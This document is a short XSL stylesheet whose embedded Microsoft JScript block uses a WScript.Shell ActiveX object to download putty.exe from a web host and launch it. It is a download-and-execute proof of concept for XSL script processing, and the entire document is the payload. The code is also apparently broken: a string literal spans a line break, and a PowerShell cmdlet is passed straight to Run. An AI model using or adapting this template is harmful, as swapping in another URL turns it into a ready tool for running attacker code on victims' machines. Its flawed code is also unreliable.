<?xml version='1.0'?>
<stylesheet
xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt"
xmlns:user="placeholder"
version="1.0">
<output method="text"/>
	<ms:script implements-prefix="user" language="JScript">
	<![CDATA[
	var r = new ActiveXObject("WScript.Shell").Run("Invoke-WebRequest -uri https://the.earth.li/~sgtatham/putty/latest/w64/putty.exe -o putty.exe;start putty.exe
");
	]]> </ms:script>
</stylesheet>
